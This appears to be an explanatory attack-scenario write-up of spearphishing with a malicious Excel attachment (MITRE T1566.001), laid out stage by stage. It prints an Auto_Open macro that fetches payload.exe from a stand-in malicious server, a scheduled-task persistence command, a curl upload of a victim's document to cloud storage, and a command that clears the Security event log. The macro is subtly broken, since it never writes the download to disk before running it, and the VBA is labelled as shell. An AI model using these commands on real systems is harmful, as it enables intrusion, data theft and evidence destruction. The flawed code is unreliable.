Pattern Name: T1566.001 - Spearphishing Attachment
Scenario Overview: This attack scenario illustrates how an attacker uses a spearphishing email with a malicious attachment to gain initial access to a victim's system. The attack progresses through multiple stages, leveraging various applications such as Outlook for email, Excel for executing the payload, and potentially a web browser for further exploitation or data exfiltration.

Attack Flow Breakdown:

**Stage 1: Initial Access via Spearphishing Email**
- **Applications Involved**: Outlook
- **User Action**: The victim receives an email that appears to be from a trusted source, containing a malicious Excel attachment.
- **Key Artifacts**: 
  - Email Subject: "Important Update Required"
  - Attachment: "Update_Invoice.xlsx"
  
```shell
# The attacker sends a spearphishing email with a malicious attachment.
# The email is crafted to appear legitimate to increase the likelihood of the victim opening it.
```

**Stage 2: Execution of Malicious Payload**
- **Applications Involved**: Excel
- **User Action**: The victim opens the attachment, which prompts them to enable macros to view the content.
- **Key Artifacts**: 
  - Excel Macro: `Auto_Open()`
  - Malicious Code: Downloads a payload from a remote server.

```shell
# The macro executes upon opening the document, downloading a malicious payload.
# Example of a macro that could be used:
Sub Auto_Open()
    Dim objHTTP As Object
    Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    objHTTP.Open "GET", "http://malicious-server.com/payload.exe", False
    objHTTP.send
    ' Execute the downloaded payload
    Shell "C:\Users\Victim\Downloads\payload.exe"
End Sub
```

**Stage 3: Establishing Persistence**
- **Applications Involved**: Windows Explorer, Task Scheduler
- **User Action**: The malicious payload installs a backdoor and creates a scheduled task for persistence.
- **Key Artifacts**: 
  - Scheduled Task: "UpdateTask"
  - Backdoor executable: "C:\ProgramData\malicious.exe"

```shell
# The payload creates a scheduled task to ensure persistence.
schtasks /create /tn "UpdateTask" /tr "C:\ProgramData\malicious.exe" /sc onlogon /rl highest
```

**Stage 4: Data Exfiltration**
- **Applications Involved**: Web Browser (Chrome), Cloud Storage Service (Google Drive)
- **User Action**: The attacker uses the compromised system to upload sensitive files to a cloud storage service.
- **Key Artifacts**: 
  - File: "sensitive_data.docx"
  - Upload URL: "https://drive.google.com/upload"

```shell
# The attacker uses a web browser to upload files to Google Drive.
# This could be automated via a script or manually done by the attacker.
curl -X POST -F "file=@C:\Users\Victim\Documents\sensitive_data.docx" "https://drive.google.com/upload"
```

**Stage 5: Cleanup and Covering Tracks**
- **Applications Involved**: Windows Command Prompt
- **User Action**: The attacker deletes logs and any evidence of the attack.
- **Key Artifacts**: 
  - Command to delete logs: "C:\Windows\System32\wevtutil.exe cl Security"

```shell
# The attacker clears event logs to cover their tracks.
C:\Windows\System32\wevtutil.exe cl Security
```
